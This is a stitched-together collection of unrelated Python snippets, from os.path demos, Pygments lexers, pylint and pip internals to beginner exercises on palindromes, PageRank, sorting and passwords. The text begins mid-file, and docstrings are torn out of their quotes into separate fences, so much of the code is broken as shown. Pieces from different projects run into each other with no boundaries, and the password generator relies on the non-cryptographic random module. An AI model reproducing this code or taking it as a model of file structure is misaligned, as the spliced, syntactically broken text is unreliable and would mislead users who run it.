    ('/one', '/two', '/three'),
]

for parts in PATHS:
    print('{} : {!r}'.format(parts, os.path.join(*parts)))

#```


```pyCompute a "normalized" path.```


```py


#end_pymotw_header
import os.path

PATHS = [
    'one//two//three',
    'one/./two/./three',
    'one/../alt/two/three',
]

for path in PATHS:
    print('{!r:>22} : {!r}'.format(path, os.path.normpath(path)))

#```


```pyFind attributes of a file other than its name.```


```py


#end_pymotw_header
import os.path
import time

print('File         :', __file__)
print('Access time  :', time.ctime(os.path.getatime(__file__)))
print('Modified time:', time.ctime(os.path.getmtime(__file__)))
print('Change time  :', time.ctime(os.path.getctime(__file__)))
print('Size         :', os.path.getsize(__file__))

#```


```pySeparate a path into its directory and base components.```


```py


#end_pymotw_header
import os.path

PATHS = [
    '/one/two/three',
    '/one/two/three/',
    '/',
    '.',
    '',
]

for path in PATHS:
    print('{!r:>17} : {}'.format(path, os.path.split(path)))

#```


```pySeparate a filename into the base and extension.```


```py


#end_pymotw_header
import os.path

PATHS = [
    'filename.txt',
    'filename',
    '/path/to/filename.txt',
    '/',
    '',
    'my-archive.tar.gz',
    'no-extension.',
]

for path in PATHS:
    print('{!r:>21} : {!r}'.format(path, os.path.splitext(path)))

#```


```pyTest properties of a file.```


```py


#end_pymotw_header
import os.path

FILENAMES = [
    __file__,
    os.path.dirname(__file__),
    '/',
    './broken_link',
]

for file in FILENAMES:
    print('File        : {!r}'.format(file))
    print('Absolute    :', os.path.isabs(file))
    print('Is File?    :', os.path.isfile(file))
    print('Is Dir?     :', os.path.isdir(file))
    print('Is Link?    :', os.path.islink(file))
    print('Mountpoint? :', os.path.ismount(file))
    print('Exists?     :', os.path.exists(file))
    print('Link Exists?:', os.path.lexists(file))
    print()
````

````py
    pygments.lexers.other
    ~~~~~~~~~~~~~~~~~~~~~

    Just export lexer classes previously contained in this module.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexers.sql import SqlLexer, MySqlLexer, SqliteConsoleLexer
from pygments.lexers.shell import BashLexer, BashSessionLexer, BatchLexer, \
    TcshLexer
from pygments.lexers.robotframework import RobotFrameworkLexer
from pygments.lexers.testing import GherkinLexer
from pygments.lexers.esoteric import BrainfuckLexer, BefungeLexer, RedcodeLexer
from pygments.lexers.prolog import LogtalkLexer
from pygments.lexers.snobol import SnobolLexer
from pygments.lexers.rebol import RebolLexer
from pygments.lexers.configs import KconfigLexer, Cfengine3Lexer
from pygments.lexers.modeling import ModelicaLexer
from pygments.lexers.scripting import AppleScriptLexer, MOOCodeLexer, \
    HybrisLexer
from pygments.lexers.graphics import PostScriptLexer, GnuplotLexer, \
    AsymptoteLexer, PovrayLexer
from pygments.lexers.business import ABAPLexer, OpenEdgeLexer, \
    GoodDataCLLexer, MaqlLexer
from pygments.lexers.automation import AutoItLexer, AutohotkeyLexer
from pygments.lexers.dsls import ProtoBufLexer, BroLexer, PuppetLexer, \
    MscgenLexer, VGLLexer
from pygments.lexers.basic import CbmBasicV2Lexer
from pygments.lexers.pawn import SourcePawnLexer, PawnLexer
from pygments.lexers.ecl import ECLLexer
from pygments.lexers.urbi import UrbiscriptLexer
from pygments.lexers.smalltalk import SmalltalkLexer, NewspeakLexer
from pygments.lexers.installers import NSISLexer, RPMSpecLexer
from pygments.lexers.textedit import AwkLexer
from pygments.lexers.smv import NuSMVLexer

__all__ = []

def complementary():
    while True:
        complementary = float(input("Complementary of : "))
        if complementary <= 90:
            complement = 90 - complementary
            return complement
            break
        else:
            print("Number greater than 90 degree. Try again")
            continue


def supplementary():
    while True:
        supplementary = float(input("Supplementary of : "))
        if supplementary <= 180:
            supplement = 180 - supplementary
            return supplement
            break
        else:
            print("Number greater than 180 degree. Try again")
            continue


while True:
    countOrEnd = str(input("Count or End : "))
    if countOrEnd.strip() == "Count":
        print("\nSupp for supplementary\nComp for complementary")
        getSuppOrCom = str(input("Supp or Comp : "))
        if getSuppOrCom.strip() == "Supp":
            print(supplementary())
            continue
        elif getSuppOrCom.strip() == "Comp":
            print(complementary())
            continue
        else:
            break
    else:
        quit()

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE

import collections
from typing import Any, NamedTuple

from pylint import interfaces
from pylint.constants import PY38_PLUS
from pylint.testutils.constants import UPDATE_OPTION


class Message(
    collections.namedtuple("Message", ["msg_id", "line", "node", "args", "confidence"])
):
    def __new__(cls, msg_id, line=None, node=None, args=None, confidence=None):
        return tuple.__new__(cls, (msg_id, line, node, args, confidence))

    def __eq__(self, other):
        if isinstance(other, Message):
            if self.confidence and other.confidence:
                return super().__eq__(other)
            return self[:-1] == other[:-1]
        return NotImplemented  # pragma: no cover


class MalformedOutputLineException(Exception):
    def __init__(self, row, exception):
        example = "msg-symbolic-name:42:27:MyClass.my_function:The message"
        other_example = "msg-symbolic-name:7:42::The message"
        expected = [
            "symbol",
            "line",
            "column",
            "MyClass.myFunction, (or '')",
            "Message",
            "confidence",
        ]
        reconstructed_row = ""
        i = 0
        try:
            for i, column in enumerate(row):
                reconstructed_row += f"\t{expected[i]}='{column}' ?\n"
            for missing in expected[i + 1 :]:
                reconstructed_row += f"\t{missing}= Nothing provided !\n"
        except IndexError:
            pass
        raw = ":".join(row)
        msg = f"""\
{exception}

Expected '{example}' or '{other_example}' but we got '{raw}':
{reconstructed_row}

Try updating it with: 'python tests/test_functional.py {UPDATE_OPTION}'"""
        Exception.__init__(self, msg)


class OutputLine(NamedTuple):
    symbol: str
    lineno: int
    column: int
    object: Any
    msg: str
    confidence: str

    @classmethod
    def from_msg(cls, msg):
        column = cls.get_column(msg.column)
        return cls(
            msg.symbol,
            msg.line,
            column,
            msg.obj or "",
            msg.msg.replace("\r\n", "\n"),
            msg.confidence.name
            if msg.confidence != interfaces.UNDEFINED
            else interfaces.HIGH.name,
        )

    @classmethod
    def get_column(cls, column):
        if not PY38_PLUS:
            return ""  # pragma: no cover
        return str(column)

    @classmethod
    def from_csv(cls, row):
        try:
            confidence = row[5] if len(row) == 6 else interfaces.HIGH.name
            column = cls.get_column(row[2])
            return cls(row[0], int(row[1]), column, row[3], row[4], confidence)
        except Exception as e:
            raise MalformedOutputLineException(row, e) from e

    def to_csv(self):
        return tuple(self)

def shuffleThePieces(arr, pieces):
    pieces = set(pieces)
    dp = [False] * (len(arr) + 1)
    dp[0] = True

    for j in range(1, len(arr) + 1):
        for i in range(j):
            if arr[i:j] in pieces and dp[i]:
                dp[j] = True
                break
    return dp[len(arr)]
````

````py
This is a pure Python implementation of the P-Series algorithm
https://en.wikipedia.org/wiki/Harmonic_series_(mathematics)#P-series

For doctests run following command:
python -m doctest -v p_series.py
or
python3 -m doctest -v p_series.py

For manual testing run:
python3 p_series.py```


```py


def p_series(nth_term: int, power: int) -> list:
    """Pure Python implementation of P-Series algorithm

    :return: The P-Series starting from 1 to last (nth) term

    Examples:
    >>> p_series(5, 2)
    [1, '1/4', '1/9', '1/16', '1/25']
    >>> p_series(-5, 2)
    []
    >>> p_series(5, -2)
    [1, '1/0.25', '1/0.1111111111111111', '1/0.0625', '1/0.04']
    >>> p_series("", 1000)
    ''
    >>> p_series(0, 0)
    []
    >>> p_series(1, 1)
    [1]
    """
    if nth_term == "":
        return nth_term
    nth_term = int(nth_term)
    power = int(power)
    series = []
    for temp in range(int(nth_term)):
        series.append(f"1/{pow(temp + 1, int(power))}" if series else 1)
    return series


if __name__ == "__main__":
    nth_term = input("Enter the last number (nth term) of the P-Series")
    power = input("Enter the power for  P-Series")
    print("Formula of P-Series => 1+1/2^p+1/3^p ..... 1/n^p")
    print(p_series(nth_term, power))

import sys

# This code exists for backwards compatibility reasons.
# I don't like it either. Just look the other way. :)

for package in ("urllib3", "idna", "chardet"):
    vendored_package = "pip._vendor." + package
    locals()[package] = __import__(vendored_package)
    # This traversal is apparently necessary such that the identities are
    # preserved (requests.packages.urllib3.* is urllib3.*)
    for mod in list(sys.modules):
        if mod == vendored_package or mod.startswith(vendored_package + "."):
            unprefixed_mod = mod[len("pip._vendor.") :]
            sys.modules[
                "pip._vendor.requests.packages." + unprefixed_mod
            ] = sys.modules[mod]

# Kinda cool, though, right?

import logging
from email.message import Message
from email.parser import FeedParser
from typing import Optional, Tuple

from pip._vendor import pkg_resources
from pip._vendor.packaging import specifiers, version
from pip._vendor.pkg_resources import Distribution

from pip._internal.exceptions import NoneMetadataError
from pip._internal.utils.misc import display_path

logger = logging.getLogger(__name__)


def check_requires_python(requires_python, version_info):
    # type: (Optional[str], Tuple[int, ...]) -> bool
    """
    Check if the given Python version matches a "Requires-Python" specifier.

    :param version_info: A 3-tuple of ints representing a Python
        major-minor-micro version to check (e.g. `sys.version_info[:3]`).

    :return: `True` if the given Python version satisfies the requirement.
        Otherwise, return `False`.

    :raises InvalidSpecifier: If `requires_python` has an invalid format.
    """
    if requires_python is None:
        # The package provides no information
        return True
    requires_python_specifier = specifiers.SpecifierSet(requires_python)

    python_version = version.parse(".".join(map(str, version_info)))
    return python_version in requires_python_specifier


def get_metadata(dist):
    # type: (Distribution) -> Message
    """
    :raises NoneMetadataError: if the distribution reports `has_metadata()`
        True but `get_metadata()` returns None.
    """
    metadata_name = "METADATA"
    if isinstance(dist, pkg_resources.DistInfoDistribution) and dist.has_metadata(
        metadata_name
    ):
        metadata = dist.get_metadata(metadata_name)
    elif dist.has_metadata("PKG-INFO"):
        metadata_name = "PKG-INFO"
        metadata = dist.get_metadata(metadata_name)
    else:
        logger.warning("No metadata found in %s", display_path(dist.location))
        metadata = ""

    if metadata is None:
        raise NoneMetadataError(dist, metadata_name)

    feed_parser = FeedParser()
    # The following line errors out if with a "NoneType" TypeError if
    # passed metadata=None.
    feed_parser.feed(metadata)
    return feed_parser.close()


def get_requires_python(dist):
    # type: (pkg_resources.Distribution) -> Optional[str]
    """
    Return the "Requires-Python" metadata for a distribution, or None
    if not present.
    """
    pkg_info_dict = get_metadata(dist)
    requires_python = pkg_info_dict.get("Requires-Python")

    if requires_python is not None:
        # Convert to a str to satisfy the type checker, since requires_python
        # can be a Header object.
        requires_python = str(requires_python)

    return requires_python


def get_installer(dist):
    # type: (Distribution) -> str
    if dist.has_metadata("INSTALLER"):
        for line in dist.get_metadata_lines("INSTALLER"):
            if line.strip():
                return line.strip()
    return ""
````

````py
Key bindings for extra page navigation: bindings for up/down scrolling through
long pages, like in Emacs or Vi.```


```py
from prompt_toolkit.filters import buffer_has_focus, emacs_mode, vi_mode
from prompt_toolkit.key_binding.key_bindings import (
    ConditionalKeyBindings,
    KeyBindings,
    KeyBindingsBase,
    merge_key_bindings,
)

from .scroll import (
    scroll_backward,
    scroll_forward,
    scroll_half_page_down,
    scroll_half_page_up,
    scroll_one_line_down,
    scroll_one_line_up,
    scroll_page_down,
    scroll_page_up,
)

__all__ = [
    "load_page_navigation_bindings",
    "load_emacs_page_navigation_bindings",
    "load_vi_page_navigation_bindings",
]


def load_page_navigation_bindings() -> KeyBindingsBase:
    """
    Load both the Vi and Emacs bindings for page navigation.
    """
    # Only enable when a `Buffer` is focused, otherwise, we would catch keys
    # when another widget is focused (like for instance `c-d` in a
    # ptterm.Terminal).
    return ConditionalKeyBindings(
        merge_key_bindings(
            [
                load_emacs_page_navigation_bindings(),
                load_vi_page_navigation_bindings(),
            ]
        ),
        buffer_has_focus,
    )


def load_emacs_page_navigation_bindings() -> KeyBindingsBase:
    """
    Key bindings, for scrolling up and down through pages.
    This are separate bindings, because GNU readline doesn't have them.
    """
    key_bindings = KeyBindings()
    handle = key_bindings.add

    handle("c-v")(scroll_page_down)
    handle("pagedown")(scroll_page_down)
    handle("escape", "v")(scroll_page_up)
    handle("pageup")(scroll_page_up)

    return ConditionalKeyBindings(key_bindings, emacs_mode)


def load_vi_page_navigation_bindings() -> KeyBindingsBase:
    """
    Key bindings, for scrolling up and down through pages.
    This are separate bindings, because GNU readline doesn't have them.
    """
    key_bindings = KeyBindings()
    handle = key_bindings.add

    handle("c-f")(scroll_forward)
    handle("c-b")(scroll_backward)
    handle("c-d")(scroll_half_page_down)
    handle("c-u")(scroll_half_page_up)
    handle("c-e")(scroll_one_line_down)
    handle("c-y")(scroll_one_line_up)
    handle("pagedown")(scroll_page_down)
    handle("pageup")(scroll_page_up)

    return ConditionalKeyBindings(key_bindings, vi_mode)
````

````py
Author: https://github.com/bhushan-borole```









---


```py

The input graph for the algorithm is:

  A B C
A 0 1 1
B 0 0 1
C 1 0 0
````

````py

graph = [[0, 1, 1], [0, 0, 1], [1, 0, 0]]


class Node:
    def __init__(self, name):
        self.name = name
        self.inbound = []
        self.outbound = []

    def add_inbound(self, node):
        self.inbound.append(node)

    def add_outbound(self, node):
        self.outbound.append(node)

    def __repr__(self):
        return f"Node {self.name}: Inbound: {self.inbound} ; Outbound: {self.outbound}"


def page_rank(nodes, limit=3, d=0.85):
    ranks = {}
    for node in nodes:
        ranks[node.name] = 1

    outbounds = {}
    for node in nodes:
        outbounds[node.name] = len(node.outbound)

    for i in range(limit):
        print(f"======= Iteration {i + 1} =======")
        for j, node in enumerate(nodes):
            ranks[node.name] = (1 - d) + d * sum(
                [ranks[ib] / outbounds[ib] for ib in node.inbound]
            )
        print(ranks)


def main():
    names = list(input("Enter Names of the Nodes: ").split())

    nodes = [Node(name) for name in names]

    for ri, row in enumerate(graph):
        for ci, col in enumerate(row):
            if col == 1:
                nodes[ci].add_inbound(names[ri])
                nodes[ri].add_outbound(names[ci])

    print("======= Nodes =======")
    for node in nodes:
        print(node)

    page_rank(nodes)


if __name__ == "__main__":
    main()

# Input: arr[] = {11, 15, 26, 38, 9, 10}, x = 35
# Output: true
# There is a pair (26, 9) with sum 35

# Input: arr[] = {11, 15, 26, 38, 9, 10}, x = 45
# Output: false
# There is no pair with sum 45.

# Input: arr[] = {11, 15, 6, 8, 9, 10}, x = 16
# Output: true
# There is a pair (6, 10) with sum 16


def sum_pair(arr, l, num):
    for j in range(0, l + 1):
        for i in range(0, l + 1):
            temp = arr[j]
            if temp != arr[i]:
                sum = arr[i] + temp
                if sum == num:
                    return True, sum, arr[i], temp
                    break
                else:
                    pass
            else:
                pass


arr = [11, 15, 6, 8, 9, 10]
result = sum_pair(arr, len(arr) - 1, 16)
print(result)

# palindrome```


```py
write a function that check if a string is a plindrome
if it is then return true and if it is not return false

clarifying question
------------------
should we deal with case difference?
- no normalise the case of the input

````

```py

# function is_palindrome
def is_palindrome(s):
    """
        is_palindrome
        -------------
        Takes in a string as an input
        Outputs a boolean of True or False
        Depending on the outcome of the question
        - is this strong a plaindrome
    """

    # normalise our string to have all lower case letters
    lower_s = s.lower()
    # make lower_s in to a list
    list_lower_s = list(lower_s)
    # reveres the lower_s using reversed() as rev_lower_s
    rev_lower_s = list(reversed(list_lower_s))

    # compare rev_lower_s with lower_s
    if rev_lower_s == list_lower_s:
        # return True
        return True
    # otherwise
    else:
        # return False
        return False



# is_palindrome with input of "Mom"
print(is_palindrome("Mom"))  # True

print(is_palindrome("dAd")) # True

# is_palindrome with input of "Add"
print(is_palindrome("Add"))  # False

print(is_palindrome("Mom is A non Palindrome!")) # False
# https://app.codesignal.com/arcade/intro/level-1/s5PbmwxfECC52PWyQ
# Given the string, check if it is a palindrome.


def check_palindrome(input_string: str = "") -> bool:
    if 1 <= len(input_string) <= 100000:
        return input_string == input_string[::-1]
    return False

def palindromeRearranging(inputString):

    char_occur = {}

    for c in inputString:
        if c not in char_occur:
            char_occur[c] = 1
        else:
            char_occur[c] += 1

    odd_occ = [l for l in char_occur if char_occur[l] % 2]
    if len(odd_occ) > 1:
        return False
    else:
        return True

## Palindrome checker


def isPalindrome(s):
    """This function checks if a string is palindrome or not using recursion
        Input: String to be checked
        Output: True if it is a palindrome, False if it is not
    """
    if len(s) == 0:
        return True
    if s[0] != s[len(s) - 1]:
        return False

    return isPalindrome(s[1:-1])


## DRIVER CODE

if __name__ == "__main__":
    s = input("\nEnter the string to be checked: ")

    # This section asks user if comparisons are case sensitive
    case = input("\nIs it case sensitive? (1/0): ")
    if case == "0":
        tmp = s.lower()
    else:
        tmp = s[:]

    # Calling the function
    ans = isPalindrome(tmp)

    # Formatting output based on the result
    if ans:
        print(f'\n"{s}" is a palindrome\n')
    else:
        print(f'\n"{s}" is not a palindrome\n')
```

````py
Palindrome Integer

Determine whether an integer is a palindrome.
An integer is a palindrome when it reads the same backward as forward.

Input: 121
Output: True

Input: -121
Output: False
Output explanation: From left to right, it reads -121. From right to left, it becomes 121-. Therefore it is not a palindrome.

Input: 10
Output: false
Output oxplanation: Reads 01 from right to left. Therefore it is not a palindrome.

=========================================
Juste reverse the number and compare it with the original.
    Time Complexity:    O(N)    , N = number of digits
    Space Complexity:   O(1)
If you care about integer overflow (in Python you shouldn't care about this), then reverse only a half of the number
and compare it with the other half. Also this solution is faster than the previous one because iterates only a half of the number.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


##############
# Solution 1 #
##############


def palindrome_integer_1(x):
    if x < 0:
        return False

    rev = 0
    temp = x
    while temp > 0:
        rev = (rev * 10) + (temp % 10)
        temp //= 10

    return rev == x


##############
# Solution 2 #
##############


def palindrome_integer_2(x):
    # check if negative or ends with zero
    if (x < 0) or (x > 0 and x % 10 == 0):
        return False

    rev = 0
    # if the reversed number is bigger from the original
    # that means the reversed number has same number of digits or more (1 or 2 more)
    while x > rev:
        rev = (rev * 10) + (x % 10)
        x //= 10

    # first comparison is for even number of digits and the second for odd number of digits
    return (rev == x) or (rev // 10 == x)


###########
# Testing #
###########

# Test 1
# Correct result => True
x = 121
print(palindrome_integer_1(x))
print(palindrome_integer_2(x))

# Test 2
# Correct result => False
x = -121
print(palindrome_integer_1(x))
print(palindrome_integer_2(x))

# Test 2
# Correct result => False
x = 10
print(palindrome_integer_1(x))
print(palindrome_integer_2(x))

def palindromeRearranging(inputString):
    character_count, odd_frequencies = {}, 0

    # Count character frequencies
    for i in range(len(inputString)):
        if inputString[i] not in character_count:
            character_count[(inputString[i])] = 1
        elif inputString[i] in character_count:
            character_count[(inputString[i])] += 1

    # Count odd character frequencies
    for char in character_count:
        if character_count[char] % 2 == 1:
            odd_frequencies += 1

    if odd_frequencies > 1:
        return False

    return True

#!/usr/bin/env python
````

````py
Solution to Project Euler Problems
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Palindromes.```


```py


def is_palindrome(n):
    ns = str(n)
    return all(c == d for c, d in zip(ns, reversed(ns)))

# Pancake sort algorithm
# Only can reverse array from 0 to i

def pancakesort(arr):
    cur = len(arr)
    while cur > 1:
        # Find the maximum number in arr
        mi = arr.index(max(arr[0:cur]))
        # Reverse from 0 to mi
        arr = arr[mi::-1] + arr[mi+1:len(arr)]
        # Reverse whole list
        arr = arr[cur-1::-1] + arr[cur:len(arr)]
        cur -= 1
    return arr

print(pancakesort([0,10,15,3,2,9,14,13]))

from nbconvert.utils.pandoc import pandoc


def convert_pandoc(source, from_format, to_format, extra_args=None):
    """Convert between any two formats using pandoc.

    This function will raise an error if pandoc is not installed.
    Any error messages generated by pandoc are printed to stderr.

    Parameters
    ----------
    source : string
        Input string, assumed to be valid in from_format.
    from_format : string
        Pandoc format of source.
    to_format : string
        Pandoc format for output.

    Returns
    -------
    out : string
        Output as returned by pandoc.
    """
    return pandoc(source, from_format, to_format, extra_args=extra_args)
````

````py
    pygments.formatters.pangomarkup
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Formatter for Pango markup output.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.formatter import Formatter


__all__ = ['PangoMarkupFormatter']


_escape_table = {
    ord('&'): '&amp;',
    ord('<'): '&lt;',
}


def escape_special_chars(text, table=_escape_table):
    """Escape & and < for Pango Markup."""
    return text.translate(table)


class PangoMarkupFormatter(Formatter):
    """
    Format tokens as Pango Markup code. It can then be rendered to an SVG.

    .. versionadded:: 2.9
    """

    name = 'Pango Markup'
    aliases = ['pango', 'pangomarkup']
    filenames = []

    def __init__(self, **options):
        Formatter.__init__(self, **options)

        self.styles = {}

        for token, style in self.style:
            start = ''
            end = ''
            if style['color']:
                start += '<span fgcolor="#%s">' % style['color']
                end = '</span>' + end
            if style['bold']:
                start += '<b>'
                end = '</b>' + end
            if style['italic']:
                start += '<i>'
                end = '</i>' + end
            if style['underline']:
                start += '<u>'
                end = '</u>' + end
            self.styles[token] = (start, end)

    def format_unencoded(self, tokensource, outfile):
        lastval = ''
        lasttype = None

        outfile.write('<tt>')

        for ttype, value in tokensource:
            while ttype not in self.styles:
                ttype = ttype.parent
            if ttype == lasttype:
                lastval += escape_special_chars(value)
            else:
                if lastval:
                    stylebegin, styleend = self.styles[lasttype]
                    outfile.write(stylebegin + lastval + styleend)
                lastval = escape_special_chars(value)
                lasttype = ttype

        if lastval:
            stylebegin, styleend = self.styles[lasttype]
            outfile.write(stylebegin + lastval + styleend)

        outfile.write('</tt>')
````

````py
Author: OMKAR PATHAK
Created On: 17th August 2017```


```py
from string import ascii_lowercase
import inspect


def is_pangram(sentence):
    """
    A sentence containing every letter of the alphabet.

    :param sentence: Sentence to check
    :return: bool
    """

    f_string = "".join(c for c in sentence if c.isalpha()).lower()
    return set(ascii_lowercase) == set(f_string)


def get_code():
    """
    returns the code for the is_pangram function
    :return: source code
    """
    return inspect.getsource(is_pangram)
````

````py
    pygments.lexers.parasail
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexer for ParaSail.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import re

from pygments.lexer import RegexLexer, include
from pygments.token import Text, Comment, Operator, Keyword, Name, String, \
    Number, Punctuation, Literal

__all__ = ['ParaSailLexer']


class ParaSailLexer(RegexLexer):
    """
    For `ParaSail <http://www.parasail-lang.org>`_ source code.

    .. versionadded:: 2.1
    """

    name = 'ParaSail'
    aliases = ['parasail']
    filenames = ['*.psi', '*.psl']
    mimetypes = ['text/x-parasail']

    flags = re.MULTILINE

    tokens = {
        'root': [
            (r'[^\S\n]+', Text),
            (r'//.*?\n', Comment.Single),
            (r'\b(and|or|xor)=', Operator.Word),
            (r'\b(and(\s+then)?|or(\s+else)?|xor|rem|mod|'
             r'(is|not)\s+null)\b',
             Operator.Word),
            # Keywords
            (r'\b(abs|abstract|all|block|class|concurrent|const|continue|'
             r'each|end|exit|extends|exports|forward|func|global|implements|'
             r'import|in|interface|is|lambda|locked|new|not|null|of|op|'
             r'optional|private|queued|ref|return|reverse|separate|some|'
             r'type|until|var|with|'
             # Control flow
             r'if|then|else|elsif|case|for|while|loop)\b',
             Keyword.Reserved),
            (r'(abstract\s+)?(interface|class|op|func|type)',
             Keyword.Declaration),
            # Literals
            (r'"[^"]*"', String),
            (r'\\[\'ntrf"0]', String.Escape),
            (r'#[a-zA-Z]\w*', Literal),       # Enumeration
            include('numbers'),
            (r"'[^']'", String.Char),
            (r'[a-zA-Z]\w*', Name),
            # Operators and Punctuation
            (r'(<==|==>|<=>|\*\*=|<\|=|<<=|>>=|==|!=|=\?|<=|>=|'
             r'\*\*|<<|>>|=>|:=|\+=|-=|\*=|\|=|\||/=|\+|-|\*|/|'
             r'\.\.|<\.\.|\.\.<|<\.\.<)',
             Operator),
            (r'(<|>|\[|\]|\(|\)|\||:|;|,|.|\{|\}|->)',
             Punctuation),
            (r'\n+', Text),
        ],
        'numbers': [
            (r'\d[0-9_]*#[0-9a-fA-F][0-9a-fA-F_]*#', Number.Hex),  # any base
            (r'0[xX][0-9a-fA-F][0-9a-fA-F_]*', Number.Hex),        # C-like hex
            (r'0[bB][01][01_]*', Number.Bin),                      # C-like bin
            (r'\d[0-9_]*\.\d[0-9_]*[eE][+-]\d[0-9_]*',             # float exp
             Number.Float),
            (r'\d[0-9_]*\.\d[0-9_]*', Number.Float),               # float
            (r'\d[0-9_]*', Number.Integer),                        # integer
        ],
    }
````

````py
4
3
360 480
420 540
600 660
3
0 1440
1 3
2 4
5
99 150
1 10
100 301
2 5
150 250
2
0 720
720 1440

Case #1: CJC
Case #2: IMPOSSIBLE
Case #3: JCCJJ
Case #4: CC```


```py


def partneringReturn(ts):
    ts = sorted(ts, key=lambda x: [x[0], x[1]])
    j = [ts[0]]
    c = [ts[1]]
    p = "JC"
    for i in range(2, len(ts)):
        if j[-1][1] <= ts[i][0] and j[-1][0] < ts[i][0]:
            j.append(ts[i])
            p += "J"
        elif c[-1][1] <= ts[i][0] and j[-1][0] < ts[i][0]:
            c.append(ts[i])
            p += "C"
        else:
            return "IMPOSSIBLE"
    return p


t = int(input())  # read a line with a single integer
for i in range(1, t + 1):
    tasks = []
    rows = int(input())
    for _ in range(1, rows + 1):
        tasks.append([int(s) for s in input().split(" ")])
    print("Case #{}: {}".format(i, partneringReturn(tasks)))

import os


def parse_distributions_h(ffi, inc_dir):
    """
    Parse distributions.h located in inc_dir for CFFI, filling in the ffi.cdef

    Read the function declarations without the "#define ..." macros that will
    be filled in when loading the library.
    """

    with open(os.path.join(inc_dir, 'random', 'bitgen.h')) as fid:
        s = []
        for line in fid:
            # massage the include file
            if line.strip().startswith('#'):
                continue
            s.append(line)
        ffi.cdef('\n'.join(s))

    with open(os.path.join(inc_dir, 'random', 'distributions.h')) as fid:
        s = []
        in_skip = 0
        ignoring = False
        for line in fid:
            # check for and remove extern "C" guards
            if ignoring:
                if line.strip().startswith('#endif'):
                    ignoring = False
                continue
            if line.strip().startswith('#ifdef __cplusplus'):
                ignoring = True

            # massage the include file
            if line.strip().startswith('#'):
                continue

            # skip any inlined function definition
            # which starts with 'static NPY_INLINE xxx(...) {'
            # and ends with a closing '}'
            if line.strip().startswith('static NPY_INLINE'):
                in_skip += line.count('{')
                continue
            elif in_skip > 0:
                in_skip += line.count('{')
                in_skip -= line.count('}')
                continue

            # replace defines with their value or remove them
            line = line.replace('DECLDIR', '')
            line = line.replace('NPY_INLINE', '')
            line = line.replace('RAND_INT_TYPE', 'int64_t')
            s.append(line)
        ffi.cdef('\n'.join(s))


from jedi.inference.cache import inference_state_function_cache


@inference_state_function_cache()
def get_yield_exprs(inference_state, funcdef):
    return list(funcdef.iter_yield_exprs())
````

````py
ID: 2f71a85e-3c15-404c-ad79-1bbe24890762
https://en.wikipedia.org/wiki/Quicksort#Lomuto_partition_scheme
Python Algorithms, Page 123

This partition function is useful to quickselect and quicksort. There are other partition algorithms you can
pass into those algorithms for different performance.```


```py
from collections.abc import Sequence

from src.typehints import T


def partition(seq: Sequence[T]) -> tuple[list[T], T, list[T]]:
    """Split sequence into a tuple of lesser or equal values, first value, greater values."""
    pivot, *rest = seq
    low = [n for n in rest if n <= pivot]
    high = [n for n in rest if n > pivot]
    return low, pivot, high
````

````py
Author: OMKAR PATHAK
Created at: 26th August 2017```


```py


def pascals_triangle(n):
    """
    :param n: total number of lines in pascal triangle

    Pascal’s triangle is a triangular array of the binomial coefficients.
    Following are the first 6 rows of Pascal’s Triangle (when n = 6)
    1
    1 1
    1 2 1
    1 3 3 1
    1 4 6 4 1
    1 5 10 10 5 1
    """

    for line in range(1, n + 1):
        C = 1
        for i in range(1, line + 1):
            print(C, end=" ")
            C = C * (line - i) // i
        print()

# importing the required library
import random

# storing uppercase and lowercase letters in different variables
uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
lowercase_letters = uppercase_letters.lower()

# storing digits and special characters letters in different variables
digits = "0123456789"
symbols = "@#$%^&*(){}[]./\?-_"

# setting the values to true that we want to use in our passwords
# if true means we want to use that otherwise not
upper = True
lower = True
numbers = True
special_char = False

# taking a empty string
all_chars = ""

# checking conditions for all variables that we have defined above
if upper:
    all_chars += uppercase_letters
if lower:
    all_chars += lowercase_letters
if numbers:
    all_chars += digits
if special_char:
    all_chars += symbols

# taking the password length and number of passwords that we want
pass_length = 15
no_of_passwords = 10

# with the help of for loop, generating passwords
for i in range(no_of_passwords):
    password = "".join(random.sample(all_chars, pass_length))
    print(password)

# pass by value
n = 7 # @4567 => 7

def mult(n):
    n = 12 # @7956
    return n * 2 # @7956

print(n)
print(mult(n))
print(n)

## by ref
## list is mutable
l = [1, 2, 3, 4] # @9923 => @9923
# t = (1, 2, 3, 4) # @9960 => @9960

def mult_lst(l):
    for i in range(len(l)):
        l[i] += 2 # @9923 + (1 * size of data type) => @9927 = 2 * 2

print(l)
print(mult_lst(l))
print(l)

# print(t)
# print(mult_lst(t))
# print(t)





import re

password = input("Enter password to check strength: ")


def password_check(password):
    """
    This function verifys the strength of 'password'
    Returns a dict indicating the wrong criteria
    A password is considered strong if it contains:
        at least 8 characters long
        at least 1 number,
        at least 1 symbol,
        at least 1 uppercase letter,
        at least 1 lowercase letter.
    """

    # calculating the length
    length_check = len(password) < 8

    # searching for number
    num_check = re.search(r"\d", password) is None

    # searching for uppercase
    uppercase_check = re.search(r"[A-Z]", password) is None

    # searching for lowercase
    lowercase_check = re.search(r"[a-z]", password) is None

    # searching for symbols
    symbol_check = re.search(r"[ !#$%&'()*+,-./[\\\]^_`{|}~" + r'"]',
                             password) is None

    # overall result
    strong = not (length_check or num_check or uppercase_check
                  or lowercase_check or symbol_check)

    return {
        'Password is Strong': strong,
        'Password is short': length_check,
        'Password does not have number': num_check,
        'Password does not use uppercase alphabets': uppercase_check,
        'Password does not use lowecase alphabets': lowercase_check,
        'Password does not contain special character': symbol_check,
    }


dict = password_check(password)

for statement, condition in dict.items():
    if condition:
        print(statement)

# def passwordCheck(s):
#    if any(i.isdigit() for i in s) and any(i.islower() for i in s) and any(i.isupper() for i in s) and len(s) >= 5:
#        return True
#    else:
#        return False

